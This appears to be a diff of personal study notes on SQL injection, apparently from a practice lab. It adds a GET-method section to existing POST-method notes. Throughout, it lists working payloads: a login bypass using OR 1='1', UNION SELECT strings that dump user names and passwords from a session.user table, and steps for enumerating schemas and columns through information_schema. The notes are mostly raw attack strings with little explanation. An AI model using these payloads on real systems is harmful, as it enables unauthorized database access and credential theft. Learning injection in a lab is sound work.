@@ -20,8 +20,7 @@ select tireid,name,size,cost from session.Tires union select id,name,pass from s
 SELECT id, title FROM movies WHERE id = 6;
 SELECT title, year FROM movies WHERE year <= 2003;
 
-??????input post mehtod 
-??????url bar get method
+-------------------------------------POST METHOD-----------------------------------------
 
 SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 
@@ -37,3 +36,12 @@ Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_sche
 look at session colum
 Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
 Audi' UNION SELECT id,2,name,pass,5 FROM session.user;#
+
+-------------------------------------GET METHOD-----------------------------------------
+dropdown
+delete end
+OR 1=1
+find vulnerable selection
+Selection=2 UNION SELECT 1,2,3 (table came back as 1,3,2, KEEP IN MIND)
+2 UNION SELECT table_schema,columnname,table_name FROM information_schema.colums
+
